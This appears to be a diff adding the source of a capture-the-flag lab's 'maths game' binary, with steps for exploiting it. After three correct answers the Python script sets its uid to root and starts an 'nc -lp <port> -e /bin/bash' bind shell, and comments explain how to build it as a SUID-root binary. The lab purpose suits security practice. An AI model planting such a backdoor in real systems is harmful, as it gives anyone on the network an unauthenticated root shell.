@@ -19,3 +19,95 @@
 > 1. There is a folder called mysimplemathsgame. Play/run the game, answer 03 maths questions correctly and a BIND SHELL as root on some random TCP port will open. 
 > 1. From Kali Box simply connect to that port with nc. eg. nc <ip> <port told by the game>
 > 1. you are now root, read the root flag. 
+  
+## #Sourcecode of binary mysimplemathsgame
+  
+```python
+#Date: 14 Jan 2021
+#Made + Tested on: Linux debian 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
+#OS: Debian GNU/Linux 10
+
+#How to make it a binary ?
+#install pip, pyinstaller
+#run pyinstall --onefile <this file>
+#binary will be created
+#assign ROOT group and set SUID bit set
+
+#!/usr/bin/python3
+
+import os,random,sys,time;
+
+print("\n***Welcome to a new game designed by skinny3l3phant***\n");
+print("\nJust answer 03 questions correctly, and I ll give you a reward\n");
+print("\nRemember: You have to submit answers under 25 seconds\n");
+
+loop=0;
+
+while loop < 3:
+    a = random.randint(31000,35000);
+    b = random.randint(25010,55300);
+
+    if loop == 0:
+        answer = a+b;
+        print("\n"+str(a) +" + "+ str(b)+" = ??? ");
+        start=time.time();
+        userInput = input("Your answer is: ");
+        now=time.time();
+        userInput=int(userInput);
+        nettime=now-start;
+        if (userInput == answer and (nettime < 25)):
+            loop=loop+1;
+
+        else:
+            print("\nBye Bye.\n");
+            sys.exit(1);
+
+        
+    elif loop == 1:
+        answer = a*b;
+        print("\n"+str(a) +" * "+ str(b)+" = ??? ");
+        start=time.time();
+        userInput = input("Your answer is: ");
+        now=time.time();
+        userInput=int(userInput);
+        nettime=now-start;
+        if (userInput == answer and (nettime < 25)):
+ 
+            loop=loop+1;
+
+        else:
+            print("\nBye Bye\n");
+            sys.exit(1);
+
+    elif loop == 2:
+        answer = a-b;
+        print("\n"+str(a) +" - "+ str(b)+" = ??? ");
+        start=time.time();
+        userInput = input("Your answer is: ");
+        now=time.time();
+        userInput=int(userInput);
+        nettime=now-start;
+        if (userInput == answer and (nettime < 25)):
+            loop=loop+1;
+
+        else:
+            print("\nBye Bye\n");
+            sys.exit(1);
+
+
+if loop == 3:
+    print("***\nNice Maths Skills***");
+    print("***As promised, I have a reward for you***");
+    port = random.randint(1024,65000);
+    port=str(port);
+    print("I am going to open a TCP port --->"+port+" on my system, have fun with it but be gentle");
+    
+    try:
+        os.setuid(0)
+        #os.setgid(0)
+        os.system("/usr/bin/nc -lp "+port+" -e /bin/bash &");
+    
+    except:
+        print("\nSome weird error came, try again I guess :-(");
+```
+  
